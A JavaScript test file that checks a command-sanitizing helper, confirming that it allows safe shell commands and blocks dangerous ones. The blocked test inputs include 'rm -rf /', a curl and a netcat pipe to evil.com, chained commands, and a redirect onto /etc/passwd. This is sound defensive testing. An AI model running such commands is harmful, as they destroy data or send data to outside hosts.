const t = require('tap')
const sanitizeCommand = require('../../../src/lib/helpers/sanitizeCommand')

t.test('sanitizeCommand', ct => {
  // Test safe commands pass through
  ct.equal(sanitizeCommand('echo hello'), 'echo hello', 'allows simple echo command')
  ct.equal(sanitizeCommand('cat file.txt'), 'cat file.txt', 'allows cat with file')
  ct.equal(sanitizeCommand('date +%Y-%m-%d'), 'date +%Y-%m-%d', 'allows date with format')
  ct.equal(sanitizeCommand('pwd'), 'pwd', 'allows pwd command')

  // Test complex but safe commands
  ct.equal(
    sanitizeCommand('echo "Hello $(echo world)"'),
    'echo "Hello $(echo world)"',
    'allows nested command substitution in quotes'
  )
  ct.equal(
    sanitizeCommand('echo \'Single quotes with $VAR\''),
    'echo \'Single quotes with $VAR\'',
    'allows single quotes with variables'
  )

  // Test blocked dangerous commands
  ct.throws(
    () => sanitizeCommand('rm -rf /'),
    /Command 'rm' is blocked for security reasons/,
    'blocks rm command'
  )
  ct.throws(
    () => sanitizeCommand('sudo ls'),
    /Command 'sudo' is blocked for security reasons/,
    'blocks sudo command'
  )
  ct.throws(
    () => sanitizeCommand('curl http://evil.com'),
    /Command 'curl' is blocked for security reasons/,
    'blocks curl command'
  )

  // Test command injection patterns
  ct.throws(
    () => sanitizeCommand('echo hello; rm -rf /'),
    /Command contains potentially dangerous patterns/,
    'blocks command chaining with semicolon'
  )
  ct.throws(
    () => sanitizeCommand('echo hello && rm -rf /'),
    /Command contains potentially dangerous patterns/,
    'blocks command chaining with &&'
  )
  ct.throws(
    () => sanitizeCommand('echo hello | nc evil.com 1234'),
    /Command contains potentially dangerous patterns/,
    'blocks command piping'
  )
  ct.throws(
    () => sanitizeCommand('echo hello > /etc/passwd'),
    /Command contains potentially dangerous patterns/,
    'blocks output redirection'
  )

  // Test edge cases
  ct.throws(
    () => sanitizeCommand(''),
    /Command must be a non-empty string/,
    'rejects empty command'
  )
  ct.throws(
    () => sanitizeCommand(null),
    /Command must be a non-empty string/,
    'rejects null command'
  )
  ct.throws(
    () => sanitizeCommand('a'.repeat(3000)),
    /Command too long/,
    'rejects overly long commands'
  )

  ct.end()
})

t.test('sanitizeCommand allows legitimate use cases from tests', ct => {
  // Test cases from the existing parse tests that should work
  const legitimateCommands = [
    'echo echo',
    'echo "I want the results of a command that includes a parenthesis (like this)."',
    'echo "I want the results of a command that includes a parenthesis \\(like this\\)."',
    'echo \'This should have a value of ﹩PWD because it is in single-quotes: $PWD\'',
    'echo This should say hello there: hello $(echo there)',
    'echo \'{"$schema":"https://json.schemastore.org/eslintrc.json","rules":{"@typescript-eslint/no-explicit-any":"error"}}\'',
    'echo tests/monorepo/apps/unencrypted/.env',
    'cat tests/file.txt'
  ]

  for (const cmd of legitimateCommands) {
    ct.doesNotThrow(
      () => sanitizeCommand(cmd),
      `should allow legitimate command: ${cmd}`
    )
  }

  ct.end()
})
